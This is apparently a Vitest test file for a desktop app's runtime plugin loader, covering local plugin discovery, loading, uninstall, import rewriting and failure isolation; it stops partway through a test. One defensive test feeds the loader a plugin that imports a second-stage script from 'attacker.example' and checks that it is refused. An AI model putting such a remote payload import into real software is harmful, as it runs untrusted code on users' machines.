import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

import type { HermesReadDirResult } from '@/global'
import type * as HermesModule from '@/hermes'

import { emitGatewayEvent } from './events'
import { $pluginRecords, publishPlugin, setPluginEnabled } from './plugins-store'
import {
  discoverRuntimePlugins,
  loadRuntimePlugin,
  uninstallDiskPlugin,
  unloadRuntimePlugin,
  watchRuntimePlugins
} from './runtime-loader'

// getStatus would supply the connected backend's hermes_home — a REMOTE path in
// remote mode. The disk scanner must NOT derive the plugin root from it (#66899).
const getStatus = vi.fn(async () => ({ hermes_home: '/remote/box/.hermes' }))

vi.mock('@/hermes', async importActual => ({
  ...(await importActual<typeof HermesModule>()),
  getStatus: () => getStatus()
}))

const desktopPluginsRoot = vi.fn<() => Promise<string>>()
const readDir = vi.fn<(path: string) => Promise<HermesReadDirResult>>()
const readFileText = vi.fn<(path: string) => Promise<{ text: string; truncated?: boolean }>>()
const readPluginSource = vi.fn<(path: string) => Promise<{ text: string; truncated?: boolean }>>()
const watchDirectory = vi.fn<(path: string) => Promise<{ id: string }>>()
const watchPreviewFile = vi.fn<(path: string) => Promise<{ id: string }>>()
const stopPreviewFileWatch = vi.fn<(id: string) => Promise<boolean>>()
const onPreviewFileChanged = vi.fn()

beforeEach(() => {
  desktopPluginsRoot.mockReset()
  readDir.mockReset()
  readFileText.mockReset()
  readPluginSource.mockReset()
  watchDirectory.mockReset()
  watchPreviewFile.mockReset()
  stopPreviewFileWatch.mockReset()
  stopPreviewFileWatch.mockResolvedValue(true)
  onPreviewFileChanged.mockReset()
  getStatus.mockClear()
  ;(window as unknown as { hermesDesktop: unknown }).hermesDesktop = {
    desktopPluginsRoot,
    onPreviewFileChanged,
    readDir,
    readFileText,
    stopPreviewFileWatch,
    watchDirectory,
    watchPreviewFile
  }
})

afterEach(() => {
  delete (window as unknown as { hermesDesktop?: unknown }).hermesDesktop
})

describe('scanDiskPlugins (#66899)', () => {
  it('scans the Electron-resolved local roots, never the backend hermes_home', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    readDir.mockResolvedValue({ entries: [] })

    await discoverRuntimePlugins()

    expect(desktopPluginsRoot).toHaveBeenCalled()
    expect(readDir).toHaveBeenCalledWith('/local/.hermes/desktop-plugins')
    // Unified halves are COPIED into the app root by Electron; the renderer
    // never scans the (profile-shaped) agent-plugins root itself.
    expect(readDir).not.toHaveBeenCalledWith('/local/.hermes/plugins')
    // The remote backend's hermes_home must never feed the local plugin scan.
    expect(getStatus).not.toHaveBeenCalled()
    expect(readDir).not.toHaveBeenCalledWith('/remote/box/.hermes/desktop-plugins')
  })

  it('no-ops when the resolvers yield no local root', async () => {
    desktopPluginsRoot.mockResolvedValue('')

    await discoverRuntimePlugins()

    expect(readDir).not.toHaveBeenCalled()
  })

  it('treats a folder without plugin.js as metadata, not a throwing file read', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    readDir.mockImplementation(async dir => {
      if (dir === '/local/.hermes/desktop-plugins') {
        return {
          entries: [{ isDirectory: true, name: 'my-feature', path: '/local/.hermes/desktop-plugins/my-feature' }]
        }
      }

      if (dir === '/local/.hermes/desktop-plugins/my-feature') {
        return {
          entries: [
            { isDirectory: false, name: 'README.md', path: '/local/.hermes/desktop-plugins/my-feature/README.md' }
          ]
        }
      }

      return { entries: [] }
    })

    await discoverRuntimePlugins()

    expect(readDir).toHaveBeenCalledWith('/local/.hermes/desktop-plugins/my-feature')
    expect(readFileText).not.toHaveBeenCalled()
  })

  it('a DIRECTORY named plugin.js is not a plugin entry (metadata walk rejects it)', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    readDir.mockImplementation(async dir => {
      if (dir === '/local/.hermes/desktop-plugins') {
        return { entries: [{ isDirectory: true, name: 'odd', path: '/local/.hermes/desktop-plugins/odd' }] }
      }

      if (dir === '/local/.hermes/desktop-plugins/odd') {
        // A folder literally named plugin.js — must resolve to "no entry".
        return {
          entries: [{ isDirectory: true, name: 'plugin.js', path: '/local/.hermes/desktop-plugins/odd/plugin.js' }]
        }
      }

      return { entries: [] }
    })

    await discoverRuntimePlugins()

    expect(readFileText).not.toHaveBeenCalled()
    expect($pluginRecords.get().odd).toBeUndefined()
  })

  it('loads a unified desktop half (app-root copy + package marker) OPT-IN and tags it with its package', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    let desktopEntryPresent = true
    const root = '/local/.hermes/desktop-plugins'

    readDir.mockImplementation(async dir => {
      if (dir === root) {
        return { entries: desktopEntryPresent ? [{ isDirectory: true, name: 'uni', path: `${root}/uni` }] : [] }
      }

      if (dir === `${root}/uni`) {
        return {
          entries: [
            { isDirectory: false, name: '.hermes-package.json', path: `${root}/uni/.hermes-package.json` },
            { isDirectory: false, name: 'plugin.js', path: `${root}/uni/plugin.js` }
          ]
        }
      }

      return { entries: [] }
    })

    const register = vi.fn()

    ;(globalThis as unknown as { __uniRegister: unknown }).__uniRegister = register
    readFileText.mockImplementation(async file =>
      file.endsWith('.hermes-package.json')
        ? { text: JSON.stringify({ package: 'uni-pkg', source: '/x/plugins/uni-pkg/desktop', sourceMtimeMs: 1 }) }
        : { text: 'export default { id: "uni", register: globalThis.__uniRegister }' }
    )
    watchPreviewFile.mockResolvedValue({ id: 'w-uni' })

    // The loader evaluates plugins via blob-URL import(), which vite's module
    // runner can't resolve in tests — reroute to a data: URL, which node's
    // native ESM loader handles.
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    try {
      await discoverRuntimePlugins()

      // Inventoried for Capabilities → Plugins with its package identity, but
      // the unified posture wins: installed-but-inert until the user toggles.
      expect($pluginRecords.get().uni).toMatchObject({ kind: 'disk', status: 'disabled', packageName: 'uni-pkg' })
      expect(register).not.toHaveBeenCalled()

      // The user's explicit enable still activates it.
      await setPluginEnabled('uni', true)
      expect(register).toHaveBeenCalledTimes(1)
      expect($pluginRecords.get().uni.status).toBe('loaded')

      // Electron removing the copy (package uninstalled) unloads the previous
      // Desktop registration instead of leaving a live ghost behind.
      desktopEntryPresent = false
      await discoverRuntimePlugins()
      expect($pluginRecords.get().uni).toBeUndefined()
      expect(stopPreviewFileWatch).toHaveBeenCalledWith('w-uni')
    } finally {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
      delete (globalThis as unknown as { __uniRegister?: unknown }).__uniRegister
    }
  })
})

describe('watchRuntimePlugins dir watch (#66899)', () => {
  it('watches the Electron-resolved app root, never the backend hermes_home', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    readDir.mockResolvedValue({ entries: [] })
    watchDirectory.mockResolvedValue({ id: 'watch-1' })

    watchRuntimePlugins()
    // Drain the async scan + startDirWatches chains.
    await vi.waitFor(() => expect(watchDirectory).toHaveBeenCalledTimes(1))

    expect(watchDirectory).toHaveBeenCalledWith('/local/.hermes/desktop-plugins')
    expect(watchDirectory).not.toHaveBeenCalledWith('/remote/box/.hermes/desktop-plugins')
    expect(getStatus).not.toHaveBeenCalled()
  })
})

describe('plugin source reads (512 KiB preview-cap bug)', () => {
  const blobToDataUrl = () => {
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    return () => {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
    }
  }

  /** Two-level standalone-root listing the metadata-walk probe needs:
   *  the root lists the package folder, the folder lists plugin.js. */
  const standaloneRootWith = (name: string) => {
    const folder = `/local/.hermes/desktop-plugins/${name}`

    readDir.mockImplementation(async dir => {
      if (dir === '/local/.hermes/desktop-plugins') {
        return { entries: [{ isDirectory: true, name, path: folder }] }
      }

      if (dir === folder) {
        return { entries: [{ isDirectory: false, name: 'plugin.js', path: `${folder}/plugin.js` }] }
      }

      return { entries: [] }
    })
  }

  it('loads the full source via readPluginSource when the shell offers it', async () => {
    ;(window.hermesDesktop as unknown as { readPluginSource: unknown }).readPluginSource = readPluginSource
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    standaloneRootWith('big')
    // The preview read would truncate this source — it must never be used.
    readFileText.mockResolvedValue({ text: '// first 512 KiB only', truncated: true })

    const register = vi.fn()

    ;(globalThis as unknown as { __bigRegister: unknown }).__bigRegister = register
    readPluginSource.mockResolvedValue({
      text: 'export default { id: "big", register: globalThis.__bigRegister }'
    })
    watchPreviewFile.mockResolvedValue({ id: 'w-big' })

    const restore = blobToDataUrl()

    try {
      await discoverRuntimePlugins()

      // The EVALUATED source came from the full read, not the truncated preview.
      expect(readPluginSource).toHaveBeenCalledWith('/local/.hermes/desktop-plugins/big/plugin.js')
      expect(register).toHaveBeenCalledTimes(1)
      expect($pluginRecords.get().big).toMatchObject({ kind: 'disk', status: 'loaded' })
    } finally {
      restore()
      delete (globalThis as unknown as { __bigRegister?: unknown }).__bigRegister
    }
  })

  it('older shell without readPluginSource: a truncated preview read fails LOUDLY, never evaluates', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    standaloneRootWith('huge')
    // 512 KiB window of a larger file — parses fine, but is NOT the plugin.
    readFileText.mockResolvedValue({
      text: 'export default { id: "huge", register: () => { throw new Error("must never evaluate") } }',
      truncated: true
    })
    watchPreviewFile.mockResolvedValue({ id: 'w-huge' })

    const restore = blobToDataUrl()

    try {
      await discoverRuntimePlugins()

      // No live plugin — an error inventory row names the folder instead.
      expect($pluginRecords.get().huge).toMatchObject({
        kind: 'disk',
        status: 'error',
        file: '/local/.hermes/desktop-plugins/huge/plugin.js'
      })
      expect($pluginRecords.get().huge.error).toMatch(/512 KiB/)
    } finally {
      restore()
    }
  })

  it('older shell, small plugin (not truncated): still loads through readFileText', async () => {
    desktopPluginsRoot.mockResolvedValue('/local/.hermes/desktop-plugins')
    standaloneRootWith('small')

    const register = vi.fn()

    ;(globalThis as unknown as { __smallRegister: unknown }).__smallRegister = register
    readFileText.mockResolvedValue({
      text: 'export default { id: "small", register: globalThis.__smallRegister }'
    })
    watchPreviewFile.mockResolvedValue({ id: 'w-small' })

    const restore = blobToDataUrl()

    try {
      await discoverRuntimePlugins()

      expect(register).toHaveBeenCalledTimes(1)
      expect($pluginRecords.get().small).toMatchObject({ kind: 'disk', status: 'loaded' })
    } finally {
      restore()
      delete (globalThis as unknown as { __smallRegister?: unknown }).__smallRegister
    }
  })

  it('disposes runtime host event subscriptions before a hot reload (#112366)', async () => {
    const restore = blobToDataUrl()
    const marker = '__runtimeEventReloadCount'
    const counters = globalThis as unknown as Record<string, number | undefined>
    counters[marker] = 0

    try {
      const source = `
        import { host } from '@hermes/plugin-sdk'
        export default {
          id: 'runtime-event-reload',
          register() {
            host.onEvent('bot_relay.outbox.pending', () => { globalThis.${marker}++ })
          }
        }
      `

      await loadRuntimePlugin(source, 'first runtime event registration')
      await loadRuntimePlugin(source, 'second runtime event registration')

      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
      expect(counters[marker]).toBe(1)

      unloadRuntimePlugin('runtime-event-reload')
      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
      expect(counters[marker]).toBe(1)
    } finally {
      unloadRuntimePlugin('runtime-event-reload')
      delete counters[marker]
      restore()
    }
  })
})

describe('uninstallDiskPlugin (Plugins hub trash button)', () => {
  const removeDesktopPlugin = vi.fn<(payload: { name: string }) => Promise<{ ok: boolean; error?: string }>>()

  const blobToDataUrl = () => {
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    return () => {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
    }
  }

  /** One standalone folder `gone-soon` at the root, loaded as plugin id `gone`. */
  const seedStandalone = async () => {
    const root = '/local/.hermes/desktop-plugins'
    desktopPluginsRoot.mockResolvedValue(root)
    readDir.mockImplementation(async dir => {
      if (dir === root) {
        return { entries: [{ isDirectory: true, name: 'gone-soon', path: `${root}/gone-soon` }] }
      }

      if (dir === `${root}/gone-soon`) {
        return { entries: [{ isDirectory: false, name: 'plugin.js', path: `${root}/gone-soon/plugin.js` }] }
      }

      return { entries: [] }
    })
    readFileText.mockResolvedValue({ text: 'export default { id: "gone", register() {} }' })
    watchPreviewFile.mockResolvedValue({ id: 'w-gone' })
    removeDesktopPlugin.mockReset()
    ;(window.hermesDesktop as unknown as { removeDesktopPlugin: unknown }).removeDesktopPlugin = removeDesktopPlugin

    await discoverRuntimePlugins()
    expect($pluginRecords.get().gone).toMatchObject({ kind: 'disk', status: 'loaded' })
  }

  it('asks Electron to delete the FOLDER by name, then retires the registration and its watch', async () => {
    const restore = blobToDataUrl()

    try {
      await seedStandalone()
      removeDesktopPlugin.mockResolvedValue({ ok: true })

      expect(await uninstallDiskPlugin('gone')).toEqual({ ok: true })

      // The folder name, never a path — Electron resolves it under the root.
      expect(removeDesktopPlugin).toHaveBeenCalledWith({ name: 'gone-soon' })
      expect($pluginRecords.get().gone).toBeUndefined()
      expect(stopPreviewFileWatch).toHaveBeenCalledWith('w-gone')
    } finally {
      restore()
      unloadRuntimePlugin('gone')
    }
  })

  it('keeps the plugin loaded and reports the reason when Electron refuses', async () => {
    const restore = blobToDataUrl()

    try {
      await seedStandalone()
      removeDesktopPlugin.mockResolvedValue({ ok: false, error: 'gone-soon is not inside the desktop-plugins folder' })

      expect(await uninstallDiskPlugin('gone')).toEqual({
        ok: false,
        error: 'gone-soon is not inside the desktop-plugins folder'
      })
      expect($pluginRecords.get().gone).toMatchObject({ kind: 'disk', status: 'loaded' })

      // Unknown ids never reach the bridge.
      expect(await uninstallDiskPlugin('never-installed')).toMatchObject({ ok: false })
      expect(removeDesktopPlugin).toHaveBeenCalledTimes(1)
    } finally {
      restore()
      removeDesktopPlugin.mockResolvedValue({ ok: true })
      await uninstallDiskPlugin('gone')
    }
  })
})

describe('bundled-shadowed disk copies', () => {
  it('skips a disk copy of a bundled plugin but publishes a visible inventory row', async () => {
    // The bundled twin is already registered (build-time glob).
    publishPlugin({ id: 'hermes-bots', name: 'Bot Mode', kind: 'bundled', status: 'loaded' })

    // Same blob→data: URL reroute as the opt-in test above.
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    try {
      const id = await loadRuntimePlugin(
        'export default { id: "hermes-bots", name: "Bot Mode", register() {} }',
        'hermes-bots',
        { file: '/local/.hermes/desktop-plugins/hermes-bots/plugin.js' }
      )

      // Skipped — the bundled copy stays the only live registration...
      expect(id).toBeNull()
      expect($pluginRecords.get()['hermes-bots']).toMatchObject({ kind: 'bundled', status: 'loaded' })

      // ...but the stale folder is DISCOVERABLE: an inventory row names it,
      // carries its path (reveal/delete affordance), and can never activate.
      expect($pluginRecords.get()['hermes-bots:disk-shadowed']).toMatchObject({
        kind: 'disk',
        status: 'disabled',
        file: '/local/.hermes/desktop-plugins/hermes-bots/plugin.js'
      })
    } finally {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
    }
  })
})

describe('specifier scanning is limited to code (strings/comments never load-block)', () => {
  // Same blob→data: URL reroute as the suites above: the loader evaluates the
  // rewritten source through URL.createObjectURL.
  const withBlobReroute = () => {
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    return () => {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
    }
  }

  it('loads a plugin whose own copy ends a sentence with "from"', async () => {
    // The specifier regex reads `from '` as an import specifier — a label like
    // 'Copy keys from' must not be load-blocked for it.
    const restore = withBlobReroute()

    try {
      const register = vi.fn()

      ;(globalThis as unknown as { __copyFromRegister: unknown }).__copyFromRegister = register

      const id = await loadRuntimePlugin(
        "const label = 'Copy keys from'\nexport default { id: 'copy-from', register: globalThis.__copyFromRegister }",
        'copy-from'
      )

      expect(id).toBe('copy-from')
      expect(register).toHaveBeenCalledTimes(1)
      expect($pluginRecords.get()['copy-from']).toMatchObject({ status: 'loaded' })
    } finally {
      unloadRuntimePlugin('copy-from')
      delete (globalThis as unknown as { __copyFromRegister?: unknown }).__copyFromRegister
      restore()
    }
  })

  it('loads a plugin whose comment mentions an import', async () => {
    const restore = withBlobReroute()

    try {
      const id = await loadRuntimePlugin(
        "// old docs said: import 'left-pad' here\nexport default { id: 'comment-import', register() {} }",
        'comment-import'
      )

      expect(id).toBe('comment-import')
    } finally {
      unloadRuntimePlugin('comment-import')
      restore()
    }
  })

  it('still rejects a real unmapped import', async () => {
    const restore = withBlobReroute()

    try {
      const id = await loadRuntimePlugin(
        "import 'left-pad'\nexport default { id: 'real-bare', register() {} }",
        'real-bare'
      )

      expect(id).toBeNull()
      expect($pluginRecords.get()['real-bare']).toMatchObject({ status: 'error' })
      expect($pluginRecords.get()['real-bare']?.error).toContain('unsupported import')
    } finally {
      restore()
    }
  })

  it('never rewrites a mapped specifier quoted inside a string', async () => {
    // Rewriting is for real imports only; a string that documents the import
    // form must reach the plugin verbatim (it used to become a blob URL).
    const restore = withBlobReroute()

    try {
      ;(globalThis as unknown as { __captured?: string }).__captured = undefined

      const id = await loadRuntimePlugin(
        `const doc = "from '@hermes/plugin-sdk'"
export default { id: 'quoted-spec', register: () => { globalThis.__captured = doc } }`,
        'quoted-spec'
      )

      expect(id).toBe('quoted-spec')
      expect((globalThis as unknown as { __captured?: string }).__captured).toBe("from '@hermes/plugin-sdk'")
    } finally {
      unloadRuntimePlugin('quoted-spec')
      delete (globalThis as unknown as { __captured?: string }).__captured
      restore()
    }
  })

  it('a backtick inside a regex literal does not flip code/string classification (#120208)', async () => {
    // The regex backtick must not open a template: the react import after it
    // stays code and is rewritten to the shim, not left bare.
    const restore = withBlobReroute()

    try {
      const id = await loadRuntimePlugin(
        "const backtick = /`/\nimport { useState } from 'react'\nconst label = `ok`\nexport default { id: 'repro', register() { void useState; void label; void backtick } }",
        'repro'
      )

      expect(id).toBe('repro')
      expect($pluginRecords.get()['repro']).toMatchObject({ status: 'loaded' })
    } finally {
      unloadRuntimePlugin('repro')
      restore()
    }
  })

  it('rewrites imports after the entities htmlReplacer regex (#120208)', async () => {
    // entities 6.0.1 encode.js (via the hermes-toolsmith bundle): the
    // character class contains a backtick, then SDK/react imports follow.
    const restore = withBlobReroute()

    try {
      const id = await loadRuntimePlugin(
        "var htmlReplacer = /[\\t\\n\\f!-,./:-@[-`{-}\\^@-\\uFFFF]/g;\nimport { host } from '@hermes/plugin-sdk'\nconst label = `ok`\nexport default { id: 'entities-re', register() { void host; void label; void htmlReplacer } }",
        'entities-re'
      )

      expect(id).toBe('entities-re')
      expect($pluginRecords.get()['entities-re']).toMatchObject({ status: 'loaded' })
    } finally {
      unloadRuntimePlugin('entities-re')
      restore()
    }
  })

  it('divisions stay code: imports after real division still rewrite (#120208)', async () => {
    // The other direction: `/` between two values is a division, not a
    // pattern, so the import below must still be seen and rewritten.
    const restore = withBlobReroute()

    try {
      const id = await loadRuntimePlugin(
        "const total = 10, count = 4, earned = 6\nconst half = total / count + earned / 2\nimport { host } from '@hermes/plugin-sdk'\nconst label = `n=${half}`\nexport default { id: 'division', register() { void host; void label } }",
        'division'
      )

      expect(id).toBe('division')
      expect($pluginRecords.get()['division']).toMatchObject({ status: 'loaded' })
    } finally {
      unloadRuntimePlugin('division')
      restore()
    }
  })

  it('does not read import syntax inside a regex literal (#120208)', async () => {
    // A regex body is not code: `from 'react'` inside it must not be
    // rewritten in place (which would corrupt the pattern).
    const restore = withBlobReroute()

    try {
      ;(globalThis as unknown as { __capturedRe?: unknown }).__capturedRe = undefined

      const id = await loadRuntimePlugin(
        "const re = /from 'react'/\nexport default { id: 'regex-spec', register: () => { globalThis.__capturedRe = re.source } }",
        'regex-spec'
      )

      expect(id).toBe('regex-spec')
      expect((globalThis as unknown as { __capturedRe?: string }).__capturedRe).toBe("from 'react'")
    } finally {
      unloadRuntimePlugin('regex-spec')
      delete (globalThis as unknown as { __capturedRe?: unknown }).__capturedRe
      restore()
    }
  })

  it('still rewrites a real mapped import', async () => {
    // The fix must not swing the other way: the SDK import is the load path.
    const restore = withBlobReroute()

    try {
      const id = await loadRuntimePlugin(
        "import { host } from '@hermes/plugin-sdk'\nexport default { id: 'real-mapped', register() { void host } }",
        'real-mapped'
      )

      expect(id).toBe('real-mapped')
      expect($pluginRecords.get()['real-mapped']).toMatchObject({ status: 'loaded' })
    } finally {
      unloadRuntimePlugin('real-mapped')
      restore()
    }
  })
})

describe('register() failure isolation', () => {
  const withBlobReroute = () => {
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    return () => {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
    }
  }

  it('a throwing register() rolls back its partial registrations and reports the error on the plugin row', async () => {
    const restore = withBlobReroute()
    const marker = '__registerThrowHits'
    const counters = globalThis as unknown as Record<string, number | undefined>
    counters[marker] = 0

    try {
      const source = `
        import { host } from '@hermes/plugin-sdk'
        export default {
          id: 'register-throw',
          register() {
            host.onEvent('bot_relay.outbox.pending', () => { globalThis.${marker}++ })
            throw new Error('register boom')
          }
        }
      `

      await loadRuntimePlugin(source, 'register-throw-folder')

      // The listener registered before the throw is disposed, not orphaned.
      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
      expect(counters[marker]).toBe(0)

      // The failure lands on the plugin's own row so the Plugins tab shows it.
      expect($pluginRecords.get()['register-throw']).toMatchObject({ status: 'error', error: 'register boom' })

      // Re-enabling neither rejects nor accumulates a second orphan.
      await expect(setPluginEnabled('register-throw', true)).resolves.toBeUndefined()
      emitGatewayEvent({ type: 'bot_relay.outbox.pending' } as never)
      expect(counters[marker]).toBe(0)
      expect($pluginRecords.get()['register-throw']).toMatchObject({ status: 'error' })
    } finally {
      unloadRuntimePlugin('register-throw')
      delete counters[marker]
      restore()
    }
  })

  it('an async register() rejection is reported on the plugin row instead of leaving it "loaded"', async () => {
    const restore = withBlobReroute()

    try {
      await loadRuntimePlugin(
        "export default { id: 'async-reject', async register() { throw new Error('late boom') } }",
        'async-reject'
      )

      await vi.waitFor(() =>
        expect($pluginRecords.get()['async-reject']).toMatchObject({ status: 'error', error: 'late boom' })
      )
    } finally {
      unloadRuntimePlugin('async-reject')
      restore()
    }
  })
})

describe('remote static imports are refused (catalog trust)', () => {
  it('rejects a static URL-scheme import before evaluation', async () => {
    const importer = vi.fn()

    const id = await loadRuntimePlugin(
      "import 'https://attacker.example/stage2.js'\nexport default { id: 'remote-import', register() {} }",
      'remote-import'
    )

    expect(id).toBeNull()
    expect(importer).not.toHaveBeenCalled()
    expect($pluginRecords.get()['remote-import']).toMatchObject({ status: 'error' })
    expect($pluginRecords.get()['remote-import']?.error).toContain('unsupported import')
  })
})

describe('loader hardening: hangs, leaks, duplicate ids, stale incarnations', () => {
  const root = '/local/.hermes/desktop-plugins'
  const counters = globalThis as unknown as Record<string, number | undefined>

  const withBlobReroute = () => {
    const createObjectURL = vi
      .spyOn(URL, 'createObjectURL')
      .mockImplementation(
        blob =>
          `data:text/javascript;base64,${Buffer.from((blob as unknown as { parts: string[] }).parts.join('')).toString('base64')}`
      )

    const revokeObjectURL = vi.spyOn(URL, 'revokeObjectURL').mockImplementation(() => undefined)
    const RealBlob = globalThis.Blob
    vi.stubGlobal(
      'Blob',
      class {
        parts: string[]
        constructor(parts: string[]) {
          this.parts = parts
        }
      }
    )

    return () => {
      createObjectURL.mockRestore()
      revokeObjectURL.mockRestore()
      vi.stubGlobal('Blob', RealBlob)
    }
  }

  /** Root listing of standalone folders (listed in the given order) whose
   *  plugin.js text comes from `sources[folder]`. */
  const rootWith = (sources: Record<string, () => string>, order = Object.keys(sources)) => {
    desktopPluginsRoot.mockResolvedValue(root)
    readDir.mockImplementation(async dir => {
      if (dir === root) {
        return { entries: order.map(name => ({ isDirectory: true, name, path: `${root}/${name}` })) }
      }

      const name = order.find(folder => dir === `${root}/${folder}`)

      return name
        ? { entries: [{ isDirectory: false, name: 'plugin.js', path: `${root}/${name}/plugin.js` }] }
        : { entries: [] }
    })
    readFileText.mockImplementation(async file => ({ text: sources[file.split('/').at(-2)!]() }))
    watchPreviewFile.mockImplementation(async file => ({ id: `w-${file}` }))
  }

  /** Yield until the loader has armed its import deadline (the scan reaches
   *  `import()` through a chain of awaited mocks, all microtasks). */
  const untilTimerArmed = async () => {
    for (let i = 0; i < 1_000 && vi.getTimerCount() === 0; i += 1) {
      await Promise.resolve()
    }
  }

  afterEach(() => {
    vi.useRealTimers()
  })

  it('a plugin whose import never settles times out as ITS error; the rest of the scan still loads', async () => {
    const restore = withBlobReroute()
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    counters.__afterHangRegister = 0

    try {
      rootWith({
        'aaa-hang': () => 'await new Promise(() => {})\nexport default { id: "hang", register() {} }',
        'bbb-ok': () => 'export default { id: "after-hang", register() { globalThis.__afterHangRegister++ } }'
      })

      const scan = discoverRuntimePlugins()
      await untilTimerArmed()
      await vi.advanceTimersByTimeAsync(10_000)
      await scan

      expect($pluginRecords.get()['aaa-hang']).toMatchObject({ status: 'error', file: `${root}/aaa-hang/plugin.js` })
      expect($pluginRecords.get()['aaa-hang']?.error).toMatch(/import timed out/)
      expect(counters.__afterHangRegister).toBe(1)
      expect($pluginRecords.get()['after-hang']).toMatchObject({ status: 'loaded' })
    } finally {
      unloadRuntimePlugin('after-hang')
      delete counters.__afterHangRegister
      restore()
    }
  })

  it('ctx.setInterval / ctx.addEventListener registrations die with the plugin on unload', async () => {
    const restore = withBlobReroute()
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout', 'setInterval', 'clearInterval'] })
    counters.__scopedTicks = 0
    counters.__scopedEvents = 0

    try {
      await loadRuntimePlugin(
        `export default {
          id: 'scoped-lifetime',
          register(ctx) {
            ctx.setInterval(() => { globalThis.__scopedTicks++ }, 1000)
            ctx.addEventListener(window, 'hermes-probe', () => { globalThis.__scopedEvents++ })
          }
        }`,
        'scoped-lifetime'
      )

      expect($pluginRecords.get()['scoped-lifetime']).toMatchObject({ status: 'loaded' })
      await vi.advanceTimersByTimeAsync(3_000)
      window.dispatchEvent(new Event('hermes-probe'))
      expect(counters.__scopedTicks).toBe(3)
      expect(counters.__scopedEvents).toBe(1)

      unloadRuntimePlugin('scoped-lifetime')
      await vi.advanceTimersByTimeAsync(3_000)
      window.dispatchEvent(new Event('hermes-probe'))
      expect(counters.__scopedTicks).toBe(3)
      expect(counters.__scopedEvents).toBe(1)
    } finally {
      unloadRuntimePlugin('scoped-lifetime')
      delete counters.__scopedTicks
      delete counters.__scopedEvents
      restore()
    }
  })

  it('two folders claiming one id: the first (sorted) owns it, the later one errors on its own row', async () => {
    const restore = withBlobReroute()
    counters.__dupAlpha = 0
    counters.__dupBeta = 0

    try {
      // Listed beta-first: the loader sorts, so alpha still wins deterministically.
      rootWith(
        {
          alpha: () => 'export default { id: "dup", register() { globalThis.__dupAlpha++ } }',
          beta: () => 'export default { id: "dup", register() { globalThis.__dupBeta++ } }'
        },
        ['beta', 'alpha']
      )

      await discoverRuntimePlugins()

      expect(counters.__dupAlpha).toBe(1)
      expect(counters.__dupBeta).toBe(0)
      expect($pluginRecords.get().dup).toMatchObject({ status: 'loaded', file: `${root}/alpha/plugin.js` })
